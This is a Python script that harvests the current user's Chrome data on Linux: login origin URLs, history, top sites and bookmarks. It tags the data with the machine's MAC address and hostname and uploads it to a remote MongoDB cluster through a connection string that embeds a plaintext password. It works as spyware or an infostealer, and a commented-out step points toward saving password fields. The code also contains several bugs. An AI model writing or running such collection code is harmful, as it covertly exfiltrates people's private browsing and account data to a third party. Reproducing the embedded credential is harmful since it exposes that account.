import sqlite3
from sqlite3 import Error
import getpass
import json
import threading
from pymongo import MongoClient
import uuid
import socket
import platform

login_data = list()
top_sites = list()
history = list()
bookmarks = list()

user_mac = str(':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])).upper()
host_name = socket.gethostname()
user_os = platform.node()

class Bookmarks:
    def __init__(self,date,name,url):
        self.name = name
        self.date = date
        self.url = url

class MongoDB:
    def __init__(self):
        client = MongoClient("mongodb+srv://benura:Benura123@clust1-tn0nm.mongodb.net/test?ssl=true&retryWrites=true&w=majority")
        print(client)
        self.client = client
        self.createDatabaseCollections()

    def createDatabaseCollections(self):
        db = self.client.save_password
        history_collection = db.history
        login_data_collection = db.login_data
        top_sites_collection = db.top_sites
        bookmarks_collection = db.bookmarks
        self.history_collection = history_collection
        self.login_data_collection = login_data_collection
        self.top_sites_collection = top_sites_collection
        self.bookmarks_collection = bookmarks_collection

    def updateHistory(self,history_array):
        history_document = {
            "mac": user_mac,
            "host_name": host_name,
            "os": user_os,
            "url": history_array
        }
        print(self.history_collection.name)
        self.history_collection.insert_one(history_document)

    def updateTopSites(self, top_sites_array):
        top_sites_document = {
            "mac": user_mac,
            "host_name": host_name,
            "os": user_os,
            "url": top_sites_array
        }
        self.top_sites_collection.insert_one(top_sites_document)

    def updateLoginData(self, login_data_array):
        login_data_document = {
            "mac": user_mac,
            "host_name": host_name,
            "os": user_os,
            "login": login_data_array
        }
        self.login_data_collection.insert_one(login_data_document)

    def updateBookmarks(self, bookmarks_array):
        bookmarks_document = {
            "mac": user_mac,
            "host_name": host_name,
            "os": user_os,
            "bookmarks": bookmarks_array
        }
        self.bookmarks_collection.insert_one(dict(bookmarks_document))

mongoDB = MongoDB()

def create_connection(db_file):
    conn = ""
    path = '/home/'+user+'/.config/google-chrome/Default/'+db_file
    print(path)
    try:
        conn = sqlite3.connect(path)
        print(conn)
    except Error as e:
        print(e)

    return conn


def getLoginDetails(conn):
    print("Process 1")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT origin_url FROM logins")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        login_data.append(row)
        # with open("password.txt",'wb') as file:
        #     file.write(row[1])
    try:
       mongoDB.updateLoginData(login_data)
    except BaseException as e:
        print("CONN1", e)

def getHistory(conn):
    print("Process 2")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT url,title,visit_count,last_visit_time FROM urls")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        history.append(row)
    try:
        mongoDB.updateHistory(history)
    except BaseException as e:
        print("CONN2", e)


def getTopSites(conn):
    print("Process 3")
    freezeDatabse(conn)
    cur = conn.cursor()
    cur.execute("SELECT url,url_rank,title FROM top_sites")

    rows = cur.fetchall()

    for row in rows:
        #print(row)
        history.append(row)
    try:
       mongoDB.updateTopSites(top_sites)
    except BaseException as e:
        print("CONN3", e)
    

def getBookmarks():
    print("Process 4")
    path = '/home/'+user+'/.config/google-chrome/Default/Bookmarks'
    with open(path) as json_file:
        data = json.load(json_file)
    roots = data['roots']
    book_marks_bar = roots['bookmark_bar']
    children = book_marks_bar['children']
    for p in children:
       # bookmarks.append(Bookmarks(p['date_added'],p['name'],p['url']))
        bookmarks.append({'date_added':p['date_added'],'name':p['name'],'url':p['url']})

    try:
        mongoDB.updateBookmarks(bookmarks)
    except BaseException as e:
        print("CONN4", e)


def freezeDatabse(conn):
    conn.commit()
    
def main():
    try:
        # create a database connection for 'Login Data'
        conn = create_connection("Login Data")
        #print(conn)
        with conn:
            print("Get Login Data")
            thread1 = threading.Thread(target=getLoginDetails(conn))
            thread1.start()
    except Error as e:
        print(e)
    finally:
        try:
            # create a database connection for 'History'
            conn = create_connection("History")
            #print(conn)
            with conn:
                print("Get History")
                thread2 = threading.Thread(target=getHistory(conn))
                thread2.start()
        except Error as e:
            print(e)
        finally:
            try:
                # create a database conection for 'Top Sites'
                conn = create_connection("Top Sites")
                print(conn)
                with conn:
                    print("Get Top Sites")
                    thread3 = threading.Thread(target=getTopSites(conn))
                    thread3.start()
            except Error as e:
                print(e)
            finally:
                # create a database connection for 'Bookmarks'
                try:
                    with conn:
                        print("Get Bookmarks")
                        thread4 = threading.Thread(target=getBookmarks())
                        thread4.start()
                except Error as e:
                    print(e)
                finally:
                    print("Updated!")
    

if __name__ == '__main__':
    user = getpass.getuser()
    print(user)
    main()
